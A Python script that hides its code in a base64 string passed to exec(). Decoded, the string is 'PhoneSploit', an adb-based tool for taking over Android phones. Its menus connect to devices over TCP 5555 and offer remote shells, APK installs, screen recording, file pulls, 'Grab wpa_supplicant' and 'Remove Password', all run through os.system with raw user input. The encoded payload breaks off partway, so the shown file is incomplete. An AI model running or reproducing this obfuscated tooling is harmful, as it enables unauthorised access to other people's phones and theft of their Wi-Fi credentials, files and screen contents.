import marshal, base64
exec(base64.b64decode("IyBjb2Rpbmc6IGxhdGluLTEKCiNDb2RlZCBCeSBadWNjY3MKIyBFbmpveQoKCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PQojSW1wb3J0cwoKaW1wb3J0IG9zCmltcG9ydCByYW5kb20KaW1wb3J0IHVybGxpYjIKaW1wb3J0IHRpbWUgYXMgdApmcm9tIGNvbG9yYW1hIGltcG9ydCBGb3JlLCBpbml0CgojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KIyBWYXJpYWJsZXMKQ3VycmVudERpciA9IG9zLnBhdGguZGlybmFtZShvcy5wYXRoLmFic3BhdGgoX19maWxlX18pKQpsb2FkX2NvdW50ID0gMAoKIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiNJbnN0YWxsIEZ1bmN0aW9ucwojIGRlZiBDb2xvcmluZ01vZGVTdGFydHVwKCk6CiMgICAgIGNvbG9yaW5nX2ZpbGUgPSBvcGVuKEN1cnJlbnREaXIrIlxcaW5zdGFsbFxcY29sb3JpbmcudHh0IiwgImErIikKIyAgICAgbGluZSA9IG9wZW4oQ3VycmVudERpcisiXFxpbnN0YWxsXFxjb2xvcmluZy50eHQiLCAiYSsiKS5yZWFkbGluZSgpCiMgICAgIGlmICd0cnVlJyBpbiBsaW5lOgojICAgICAgICAgaW5pdChjb252ZXJ0PVRydWUpCiMgICAgICAgICBtYWluKCkKIyAgICAgaWYgJ2ZhbHNlJyBpbiBsaW5lOgojICAgICAgICAgd2luZG93cz1GYWxzZQojICAgICAgICAgbWFpbigpCiMgICAgIGlmICJOT1RfTE9BREVEIiBpbiBsaW5lOgojICAgICAgICAgcGxhdGZvcm1fY2hvaWNlID0gcmF3X2lucHV0KCJBcmUgeW91IGxvYWRpbmcgdGhpcyBzY3JpcHQgaW4gKFcpaW5kb3dzIG9yIChMKWludXg6ICIpCiMgICAgICAgICBvcGVuKEN1cnJlbnREaXIrIlxcaW5zdGFsbFxcY29sb3JpbmcudHh0IiwgInciKS5jbG9zZSgpCiMgICAgICAgICBpZiBwbGF0Zm9ybV9jaG9pY2UubG93ZXIoKSA9PSAndyc6CiMgICAgICAgICAgICAgY29sb3JpbmdfZmlsZS53cml0ZSgidHJ1ZSIpCiMgICAgICAgICBlbHNlOgojICAgICAgICAgICAgIGNvbG9yaW5nX2ZpbGUud3JpdGUoImZhbHNlIikKIyAgICAgICAgICAgICB5biA9IHJhd19pbnB1dChGb3JlLldISVRFICsgIkhhdmUgeW91IGFscmVhZHkgaW5zdGFsbGVkIGFkYiB2aWEgY29tbWFuZCBsaW5lICIrRm9yZS5HUkVFTiArICJZIitGb3JlLldISVRFKyIvIitGb3JlLlJFRCsiTiAiK0ZvcmUuV0hJVEUpCiMgICAgICAgICAgICAgaWYgeW4gPT0gIm4iOgojICAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oInN1ZG8gYXB0IGluc3RhbGwgYWRiIikKIyAgICAgICAgICAgICBlbHNlOgojICAgICAgICAgICAgICAgICBtYWluKCkKCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PQojIEdyYXBoaWNzICMgaHR0cDovL3BhdG9yamsuY29tL3NvZnR3YXJlL3RhYWcvI3A9ZGlzcGxheSZmPUdyYWZmaXRpJnQ9VHlwZSUyMFNvbWV0aGluZyUyMAoKYXJyb3cgPSBGb3JlLlJFRCArICIg4pSU4pSA4pSAPiIuZGVjb2RlKCJ1dGYtOCIpICsgRm9yZS5XSElURQpjb25uZWN0ID0gRm9yZS5SRUQgKyAi4pSCIi5kZWNvZGUoInV0Zi04IikgKyBGb3JlLldISVRFCnBhZ2UyID0gRmFsc2UKCmxvZ29fZGVzaWduXzEgPSAoJycnCiAgezB9ICBfX19fICBfXyAgICAgICAgICAgICAgICAgICAgX19fX18gICAgICAgX18gICAgICBfIF9fIAogICAvIF9fIFwvIC9fICBfX19fICBfX19fICBfX18gLyBfX18vX19fXyAgLyAvX19fICAoXykgL18KICAvIC9fLyAvIF9fIFwvIF9fIFwvIF9fIFwvIF8gXFxfXyBcLyBfXyBcIC8gLyBfXyBcLyAvIF9fLwp7MX0gLyBfX19fLyAvIC8gLyAvXy8gLyAvIC8gLyAgX18vX18vIC8gL18vIC8gLyAvXy8gLyAvIC9fICAKL18vICAgL18vIC9fL1xfX19fL18vIC9fL1xfX18vX19fXy8gLl9fXy9fL1xfX19fL18vXF9fLyAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC9fLycnJykuZm9ybWF0KEZvcmUuR1JFRU4sIEZvcmUuV0hJVEUsIEZvcmUuUkVEKQoKbG9nb19kZXNpZ25fMiA9IEZvcmUuR1JFRU4gKyAnJycgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAuOycgICAgICAgICAgICAgICAgICAgICBgOywKIC47JyAgLDsnICAgICAgICAgICAgIGA7LCAgYDssICAgezB9UGhvbmVTcGxvaXQKLjsnICAsOycgICw7JyAgICAgYDssICBgOywgIGA7LAo6OiAgIDo6ICAgOiAgIHsxfSggKXswfSAgIDogICA6OiAgIDo6ICB7MX1Db2RlZCBieSBadWNjY3MgLyBNZXRhY2hhcnswfQonOi4gICc6LiAgJzouIHsxfS9fXHswfSAsOicgICw6JyAgLDonCiAnOi4gICc6LiAgICB7MX0vX19fXHswfSAgICAsOicgICw6JyAgIAogICc6LiAgICAgICB7MX0vX19fX19cezB9ICAgICAgLDonCiAgICAgICAgICAgezF9LyAgICAgICBcXHswfQonJycuZm9ybWF0KEZvcmUuR1JFRU4sIEZvcmUuV0hJVEUsIEZvcmUuUkVEKQoKbG9nb19kZXNpZ25fcHJlID0gJycnCnswfeKVlOKVkOKVl3sxfeKUrCDilKzilIzilIDilJDilIzilJDilIzilIzilIDilJB7MH3ilZTilZDilZd7MX3ilIzilIDilJDilKwgIOKUjOKUgOKUkOKUrOKUjOKUrOKUkAp7MH3ilaDilZDilZ17MX3ilJzilIDilKTilIIg4pSC4pSC4pSC4pSC4pSc4pSkIHswfeKVmuKVkOKVl3sxfeKUnOKUgOKUmOKUgiAg4pSCIOKUguKUgiDilIIgCnswfeKVqSAgezF94pS0IOKUtOKUlOKUgOKUmOKUmOKUlOKUmOKUlOKUgOKUmHswfeKVmuKVkOKVnXsxfeKUtCAg4pS04pSA4pSY4pSU4pSA4pSY4pS0IOKUtCAnJycuZm9ybWF0KEZvcmUuR1JFRU4sIEZvcmUuV0hJVEUsIEZvcmUuUkVEKQpsb2dvX2Rlc2lnbl8zID0gbG9nb19kZXNpZ25fcHJlLmRlY29kZSgidXRmLTgiKQoKbG9nb19kZXNpZ25fNCA9ICcnJwpcMDMzWzkybQogICAgICAgICAgK2h5ZE5OTk5keWgrCiAgICAgICAgK21NTU1NTU1NTU1NTU1tKwogICAgICBgZE1NbVwwMzNbMG06XDAzM1s5Mm1OTU1NTU1NTlwwMzNbMG06XDAzM1s5Mm1tTU1kYAogICAgICBoTU1NTU1NTU1NTU1NTU1NTU1NaAogIFwwMzNbOTJtLi4gIHl5eXl5eXl5eXl5eXl5eXl5eXl5ICAuLiAgICAgICAgICAgICAgXDAzM1swbSBFeHBsb2l0IHRpbWUgOikgXDAzM1s5Mm0KXDAzM1s5Mm0ubU1NbWBNTU1NTU1NTU1NTU1NTU1NTU1NTWBtTU1tLiAgICAgICAgICAgIFwwMzNbMG0gVGhhbmtzIGZvciBkb3dubG9hZGluZyFcMDMzWzkybQpcMDMzWzkybTpNTU1NLU1NTU1NTU1NTU1NTU1NTU1NTU1NLU1NTU06CjpNTU1NLU1NTU1NTU1NTU1NTU1NTU1NTU1NLU1NTU06CjpNTU1NLU1NTU1NTU1NTU1NTU1NTU1NTU1NLU1NTU06CjpNTU1NLU1NTU1NTU1NTU1NTU1NTU1NTU1NLU1NTU06Ci1NTU1NLU1NTU1NTU1NTU1NTU1NTU1NTU1NLU1NTU0tCiAreXkrIE1NTU1NTU1NTU1NTU1NTU1NTU1NICt5eSsKICAgICAgbU1NTU1NTU1NTU1NTU1NTU1NTW0KICAgICAgYC8rK01NTU1oKytoTU1NTSsrL2AKICAgICAgICAgIE1NTU1vICBvTU1NTQogICAgICAgICAgTU1NTW8gIG9NTU1NCiAgICAgICAgICBvTk1tLSAgLW1NTnMnJycKCmxvZ29fZGVzaWduXzUgPSAnJycKIHswfV9fX19fXyAgIHsxfV9fICBfXyAgICAgX19fX19fICAgICBfXyAgIF9fICAgICBfX19fX18gICAgIHswfV9fX19fXyAgICAgezF9X19fX19fICAgX18gICAgICAgICBfX19fX18gICAgIF9fICAgICBfX19fX18gIAp7MH0vXCAgPT0gXCB7MX0vXCBcX1wgXCAgIC9cICBfXyBcICAgL1wgIi0uXCBcICAgL1wgIF9fX1wgICB7MH0vXCAgX19fXCAgIHsxfS9cICA9PSBcIC9cIFwgICAgICAgL1wgIF9fIFwgICAvXCBcICAgL1xfXyAgX1wgCnswfVwgXCAgXy0vIHsxfVwgXCAgX18gXCAgXCBcIFwvXCBcICBcIFwgXC0uICBcICBcIFwgIF9fXCAgIHswfVwgXF9fXyAgXCAgezF9XCBcICBfLS8gXCBcIFxfX19fICBcIFwgXC9cIFwgIFwgXCBcICBcL18vXCBcLyAKIHswfVwgXF9cICAgIHsxfVwgXF9cIFxfXCAgXCBcX19fX19cICBcIFxfXFwiXF9cICAgXCBcX19fX19cICB7MH1cL1xfX19fX1wgIHsxfVwgXF9cICAgIFwgXF9fX19fXCAgXCBcX19fX19cICBcIFxfXCAgICBcIFxfXCAKICB7MH1cL18vICAgICB7MX1cL18vXC9fLyAgIFwvX19fX18vICAgXC9fLyBcL18vICAgXC9fX19fXy8gICB7MH1cL19fX19fLyAgIHsxfVwvXy8gICAgIFwvX19fX18vICAgXC9fX19fXy8gICBcL18vICAgICBcL18vCicnJy5mb3JtYXQoRm9yZS5XSElURSwgRm9yZS5HUkVFTikKCmxvZ29fZGVzaWduXzYgPSBGb3JlLlJFRCArICcnJwogICAgICAgICAgICAgICAgICAgICAgLF9fX18KICAgICAgICAgICAgICAgICAgICAgIHwtLS0uXFwKICAgICAgICAgICAgICBfX18gICAgIHwgICAgYCAgICAgIFBIT05FU1BMT0lUCiAgICAgICAgICAgICAvIC4tXCAgLi89KQogICAgICAgICAgICB8ICB8InxfL1wvfAogICAgICAgICAgICA7ICB8LTt8IC9ffCAgICAgICAgIFJFQVAgVEhFIFJFV0FSRFMKICAgICAgICAgICAvIFxffCB8LyBcIHwKICAgICAgICAgIC8gICAgICBcL1woIHwKICAgICAgICAgIHwgICAvICB8YCApIHwKICAgICAgICAgIC8gICBcIF8vICAgIHwKICAgICAgICAgLy0tLl8vICBcICAgIHwKICAgICAgICAgYC98KSAgICB8ICAgIC8KICAgICAgICAgICAvICAgICB8ICAgfAogICAgICAgICAuJyAgICAgIHwgICB8CiAgICAgICAgLyAgICAgICAgIFwgIHwKICAgICAgIChfLi0uX18uX18uLyAgLwoKJycnCgpsb2dvX2Rlc2lnbl83ID0gRm9yZS5HUkVFTiArICcnJwogICAgLm8gb09PT09PT09vICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBPT09vCiAgICBPYi5PT09PT09PbyAgT09Pby4gICAgICBvT09vLiAgICAgICAgICAgICAgICAgICAgICAuYWRPT09PT09PCiAgICBPYm9PIiIiIiIiIiIiIiIiLk9Pby4gLm9PT09PT28uICAgIE9PT28ub09PT09Pby4uIiIiIiIiIiIiJ09PCiAgICBPT1Aub09PT09PT09PT09PICJQT09PT09PT09PT09vLiAgIGAiT09PT09PT09PUCxPT09PT09PT09PT0InCiAgICBgTydPT09PJyAgICAgYE9PT09vIk9PT09PT09PT09PYCAuYWRPT09PT09PT08ib09PTycgICAgYE9PT09vCiAgICAuT09PTycgICAgICAgICAgICBgT09PT09PT09PT09PT09PT09PT09PT09PT08nICAgICAgICAgICAgYE9PCiAgICBPT09PTyAgICAgICAgICAgICAgICAgJyJPT09PT09PT09PT09PT09PImAgICAgICAgICAgICAgICAgb09PCiAgIG9PT09PT2JhLiAgICAgICAgICAgICAgICAuYWRPT09PT09PT09PYmEgICAgICAgICAgICAgICAuYWRPT09Pby4KICBvT09PT09PT09PT09PT2JhLiAgICAuYWRPT09PT09PT09PQF5PT09PT09PYmEuICAgICAuYWRPT09PT09PT09PT08KIE9PT09PT09PT09PT09PT09PLk9PT09PT09PT09PT09PImAgICciT09PT09PT09PT09PTy5PT09PT09PT09PT09PTwogIk9PT08iICAgICAgICJZT29PT09PTU9JT05PRE9PImAgIC4gICAnIk9PUk9BT1BPRU9PT29PWSIgICAgICJPT08iCiAgICBZICAgICAgICAgICAnT09PT09PT09PT09PT086IC5vT09vLiA6T09PT09PT09PT08/JyAgICAgICAgIDpgCiAgICA6ICAgICAgICAgICAgLm9PJU9PT09PT09PT09vLk9PT09PTy5vT09PT09PT09PT09PPyAgICAgICAgIC4KICAgIC4gICAgICAgICAgICBvT09QIiVPT09PT09PT29PT09PT09PP29PT09PTz9PT09PIk9PbwogICAgICAgICAgICAgICAgICclbyAgT09PTyIlT09PTyUiJU9PT09PIk9PT09PTyJPT08nOgogICAgICAgICAgICAgICAgICAgICAgYCQiICBgT09PTycgYE8iWSAnIGBPT09PJyAgbyAgICAgICAgICAgICAuCiAgICAuICAgICAgICAgICAgICAgICAgLiAgICAgT1AiICAgICAgICAgIDogbyAgICAgLgoKJycnCgpwYWdlXzEgPSAnJydcbgp7MH1bezF9MXswfV0gezJ9U2hvdyBDb25uZWN0ZWQgRGV2aWNlcyAgICAgIHswfVt7MX02ezB9XSB7Mn1TY3JlZW4gcmVjb3JkIGEgcGhvbmUgICAgICAgICAgICAgICB7MH1bezF9MTF7MH1dIHsyfVVuaW5zdGFsbCBhbiBhcHAgICAgICAgICAgICAgICAgICAgCnswfVt7MX0yezB9XSB7Mn1EaXNjb25lY3QgYWxsIGRldmljZXMgICAgICAgezB9W3sxfTd7MH1dIHsyfVNjcmVlbiBTaG90IGEgcGljdHVyZSBvbiBhIHBob25lICAgIHswfVt7MX0xMnswfV0gezJ9U2hvdyByZWFsIHRpbWUgbG9nIG9mIGRldmljZSAgICAgICAKezB9W3sxfTN7MH1dIHsyfUNvbm5lY3QgYSBuZXcgcGhvbmUgICAgICAgICB7MH1bezF9OHswfV0gezJ9UmVzdGFydCBTZXJ2ZXIgICAgICAgICAgICAgICAgICAgICAgezB9W3sxfTEzezB9XSB7Mn1EdW1wIFN5c3RlbSBJbmZvICAgICAgICAgICAgICAgICAgIAp7MH1bezF9NHswfV0gezJ9QWNjZXNzIFNoZWxsIG9uIGEgcGhvbmUgICAgIHswfVt7MX05ezB9XSB7Mn1QdWxsIGZvbGRlcnMgZnJvbSBwaG9uZSB0byBwYyAgICAgICB7MH1bezF9MTR7MH1dIHsyfUxpc3QgYWxsIGFwcHMgb24gYSBwaG9uZSAgICAgICAgICAgCnswfVt7MX01ezB9XSB7Mn1JbnN0YWxsIGFuIGFwayBvbiBhIHBob25lICAgezB9W3sxfTEwezB9XSB7Mn1UdXJuIFRoZSBEZXZpY2Ugb2ZmICAgICAgICAgICAgICAgIHswfVt7MX0xNXswfV0gezJ9UnVuIGFuIGFwcCAgICAgICAgICAgICAgICAgICAgICAgICAKCgp7MH1bezF9OTl7MH1dIHsyfUV4aXQgICB7MH1bezF9MHswfV0gezJ9Q2xlYXIgICB7MH1bezF9cHswfV0gTmV4dCBQYWdlICAgICAgICAgICAgICAgICAgICAgICAgICAgdjEuMgonJycuZm9ybWF0KEZvcmUuQ1lBTiwgRm9yZS5SRUQsIEZvcmUuR1JFRU4pCgpwYWdlXzIgPSAnJydcbgp7MH1bezF9MTZ7MH1dezJ9IFBvcnQgRm9yd2FyZGluZyAgICAgICAgICAgICAgICB7MH1bezF9MjF7MH1dezJ9IE5ldFN0YXQgCnswfVt7MX0xN3swfV17Mn0gR3JhYiB3cGFfc3VwcGxpY2FudCAgICAgICAgICAgIHswfVt7MX0yMnswfV17Mn0gVHVybiBXaUZpIE9uL09mZiAgICAgICAgICAgICAgICAgCnswfVt7MX0xOHswfV17Mn0gU2hvdyBNYWMvSW5ldCAgICAgICAgICAgICAgICAgIHswfVt7MX0yM3swfV17Mn0gUmVtb3ZlIFBhc3N3b3JkCnswfVt7MX0xOXswfV17Mn0gRXh0cmFjdCBhcGsgZnJvbSBhcHAgICAgICAgICAgIHswfVt7MX0yNHswfV17Mn0gVXNlIEtleWNvZGUgICAgICAgICAgICAKezB9W3sxfTIwezB9XXsyfSBHZXQgQmF0dGVyeSBTdGF0dXMgICAgICAgICAgICAgezB9W3sxfTI1ezB9XXsyfSBHZXQgQ3VycmVudCBBY3Rpdml0eSAgICAgICAgICAgICAgICAgIAoKCnswfVt7MX05OXswfV0gezJ9RXhpdCAgIHswfVt7MX0wezB9XSB7Mn1DbGVhciAgIHswfVt7MX1iezB9XSBCYWNrIHRvIHBhZ2Ugb25lCicnJy5mb3JtYXQoRm9yZS5DWUFOLCBGb3JlLlJFRCwgRm9yZS5HUkVFTikKCgojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KI01haW4KZGVmIG1haW4oKToKICAgIHBhZ2VfbnVtID0gMQogICAgb3B0aW9uID0gcmF3X2lucHV0KEZvcmUuV0hJVEUgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihtYWluX21lbnUpICIrRm9yZS5XSElURSArICI+ICIpCiAgICBpZiBvcHRpb24gPT0gJzEnOgogICAgICAgIG9zLnN5c3RlbSgiYWRiIGRldmljZXMgLWwiKQogICAgZWxpZiBvcHRpb24gID09ICAnMic6CiAgICAgICAgb3Muc3lzdGVtKCJhZGIgZGlzY29ubmVjdCIpCiAgICBlbGlmIG9wdGlvbiA9PSAnMyc6CiAgICAgICAgb3Muc3lzdGVtKCJhZGIgdGNwaXAgNTU1NSIpCiAgICAgICAgcHJpbnQgKCgiXG5bezB9K3sxfV0gRW50ZXIgYSBwaG9uZXMgaXAgYWRkcmVzcy4iKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgIGlwID0gcmF3X2lucHV0IChhcnJvdysiIHBob25lc3Bsb2l0IitGb3JlLlJFRCArICIoY29ubmVjdF9waG9uZSkgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICBvcy5zeXN0ZW0oImFkYiBjb25uZWN0ICIraXArIjo1NTU1IikKICAgIAogICAgZWxpZiBvcHRpb24gID09ICc0JzoKICAgICAgICBwcmludCAoKCJcblt7MH0rezF9XUVudGVyIGEgZGV2aWNlIG5hbWUuIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICBkZXZpY2VfbmFtZSA9IHJhd19pbnB1dChhcnJvdyArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKHNoZWxsX29uX3Bob25lKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiBzaGVsbCIpCgogICAgZWxpZiBvcHRpb24gPT0gJzUnOgogICAgICAgIHByaW50ICgoIlxuW3swfSt7MX1dRW50ZXIgYSBkZXZpY2UgbmFtZS4iKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgIGRldmljZV9uYW1lID0gcmF3X2lucHV0KGFycm93ICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIoYXBrX2luc3RhbGwpICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgcHJpbnQgKCgiICAgICAiK2Nvbm5lY3QpKQogICAgICAgIHByaW50ICgoIiAgICBbezB9K3sxfV1FbnRlciB0aGUgYXBrIGxvY2F0aW9uLiIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgYXBrX2xvY2F0aW9uID0gcmF3X2lucHV0KCIgICAgIithcnJvdyArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKGFwa19pbnN0YWxsKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICAiK2RldmljZV9uYW1lKyIgaW5zdGFsbCAiK2Fwa19sb2NhdGlvbikKICAgICAgICBwcmludCAoRm9yZS5HUkVFTiAgKyAgIkFwayBoYXMgYmVlbiBpbnN0YWxsZWQuIikKCiAgICBlbGlmIG9wdGlvbiA9PSAgJzYnOgogICAgICAgIHByaW50ICgoIlxuW3swfSt7MX1dRW50ZXIgYSBkZXZpY2UgbmFtZS4iKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgIGRldmljZV9uYW1lID0gcmF3X2lucHV0KGFycm93ICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIoc2NyZWVuX3JlY29yZCkgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICBwcmludCAoKCIgICAgICIrY29ubmVjdCkpCiAgICAgICAgcHJpbnQgKCgiICAgIFt7MH0rezF9XSBQbGVhc2Ugd2FpdCAzbSBpdHMgcmVjb3JkaW5nIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICBwcmludCAoKCIgICAgICIrY29ubmVjdCkpCiAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZSsiIHNoZWxsIHNjcmVlbnJlY29yZCAvc2RjYXJkL2RlbW8ubXA0IikKICAgICAgICBwcmludCAoKCIgICAgW3swfSt7MX1dRW50ZXIgd2hlcmUgeW91IHdvdWxkIGxpa2UgdGhlIHZpZGVvIHRvIGJlIHNhdmVkLiIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgcGxhY2VfbG9jYXRpb24gPSByYXdfaW5wdXQoIiAgICAiK2Fycm93ICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIoc2NyZWVuX3JlY29yZCkgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiK2RldmljZV9uYW1lKyIgcHVsbCAvc2RjYXJkL2RlbW8ubXA0ICIrcGxhY2VfbG9jYXRpb24pCgogICAgZWxpZiBvcHRpb24gID09ICc3JzoKICAgICAgICBwcmludCAoKCJcblt7MH0rezF9XUVudGVyIGEgZGV2aWNlIG5hbWUuIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICBkZXZpY2VfbmFtZSA9IHJhd19pbnB1dChhcnJvdyArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKHNjcmVlbnNob3QpICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZSsiIHNoZWxsIHNjcmVlbmNhcCAvc2RjYXJkL3NjcmVlbi5wbmciKQogICAgICAgIHByaW50ICgoIiAgICAgIitjb25uZWN0KSkKICAgICAgICBwcmludCAoKCIgICAgW3swfSt7MX1dRW50ZXIgd2hlcmUgeW91IHdvdWxkIGxpa2UgdGhlIHNjcmVlbnNob3QgdG8gYmUgc2F2ZWQuIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICBwbGFjZV9sb2NhdGlvbiA9IHJhd19pbnB1dCgiICAgICIrYXJyb3cgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihzY3JlZW5zaG90KSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiBwdWxsIC9zZGNhcmQvc2NyZWVuLnBuZyAiK3BsYWNlX2xvY2F0aW9uKQoKICAgIGVsaWYgb3B0aW9uID09ICc4JzoKICAgICAgICBvcy5zeXN0ZW0oImFkYiBraWxsLXNlcnZlciAmJiBhZGIgc3RhcnQtc2VydmVyIikKICAgIAogICAgZWxpZiBvcHRpb24gPT0gJzknOgogICAgICAgIHByaW50ICgoIlxuW3swfSt7MX1dRW50ZXIgYSBkZXZpY2UgbmFtZS4iKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgIGRldmljZV9uYW1lID0gcmF3X2lucHV0KGFycm93ICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIoZmlsZV9wdWxsKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgIHByaW50ICgoIiAgICAgIitjb25uZWN0KSkKICAgICAgICBwcmludCAoKCIgICAgW3swfSt7MX1dRW50ZXIgYSBmaWxlIGxvY2F0aW9uIG9uIGEgZGV2aWNlIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICBmaWxlX2xvY2F0aW9uID0gcmF3X2lucHV0KCIgICAgIithcnJvdyArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKGZpbGVfcHVsbCkgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICBwcmludCAoKCIgICAgICAgICIrY29ubmVjdCkpCiAgICAgICAgcHJpbnQgKCgiICAgICAgIFt7MH0rezF9XUVudGVyIHdoZXJlIHlvdSB3b3VsZCBsaWtlIHRoZSBmaWxlIHRvIGJlIHNhdmVkLiIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgcGxhY2VfbG9jYXRpb24gPSByYXdfaW5wdXQoIiAgICAgICAiK2Fycm93ICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIoZmlsZV9wdWxsKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiBwdWxsICIrZmlsZV9sb2NhdGlvbisiICIrcGxhY2VfbG9jYXRpb24pCgogICAgZWxpZiBvcHRpb24gPT0gJzEwJzoKICAgICAgICBwcmludCAoKCJcblt7MH0rezF9XUVudGVyIGEgZGV2aWNlIG5hbWUuIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICBkZXZpY2VfbmFtZSA9IHJhd19pbnB1dChhcnJvdyArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKGRldmljZV9yZWJvb3QpICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZSsgIiByZWJvb3QgIikKICAgIAogICAgZWxpZiBvcHRpb24gPT0gICcxMSc6CiAgICAgICAgcHJpbnQgKCgiXG5bezB9K3sxfV1FbnRlciBhIGRldmljZSBuYW1lLiIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgZGV2aWNlX25hbWUgPSByYXdfaW5wdXQoYXJyb3cgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihhcHBfZGVsZXRlKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgIHByaW50ICgoIiAgICAgIitjb25uZWN0KSkKICAgICAgICBwcmludCAoKCIgICAgW3swfSt7MX1dRW50ZXIgYSBwYWNrYWdlIG5hbWUuIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICBwYWNrYWdlX25hbWUgPSByYXdfaW5wdXQoIiAgICAiK2Fycm93ICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIoYXBwX2RlbGV0ZSkgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiK2RldmljZV9uYW1lKyIgdW5pc3RhbGwgIitwYWNrYWdlX25hbWUpCgogICAgZWxpZiBvcHRpb24gPT0gJzEyJzoKICAgICAgICBwcmludCAoKCJcblt7MH0rezF9XUVudGVyIGEgZGV2aWNlIG5hbWUuIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICBkZXZpY2VfbmFtZSA9IHJhd19pbnB1dChhcnJvdyArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKGxvZykgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICBvcy5zeXN0ZW0oJ2FkYiAtcyAnK2RldmljZV9uYW1lKyIgbG9nY2F0ICIpCgogICAgZWxpZiBvcHRpb24gPT0gJzEzJzoKICAgICAgICBwcmludCAoKCJcblt7MH0rezF9XUVudGVyIGEgZGV2aWNlIG5hbWUuIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICBkZXZpY2VfbmFtZSA9IHJhd19pbnB1dChhcnJvdyArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKHN5c19pbmZvKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiBkdW1wc3lzIikgICAgICAgIAoKICAgIGVsaWYgb3B0aW9uID09ICcxNCc6CiAgICAgICAgcHJpbnQgKCgiXG5bezB9K3sxfV1FbnRlciBhIGRldmljZSBuYW1lLiIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgZGV2aWNlX25hbWUgPSByYXdfaW5wdXQoYXJyb3cgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihwYWNrYWdlX21hbmFnZXIpICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIiArZGV2aWNlX25hbWUrICIgc2hlbGwgcG0gbGlzdCBwYWNrYWdlcyAtZiIpCiAgICAgICAgbWFpbigpCgogICAgZWxpZiBvcHRpb24gPT0gJzE1JzoKICAgICAgICBwcmlud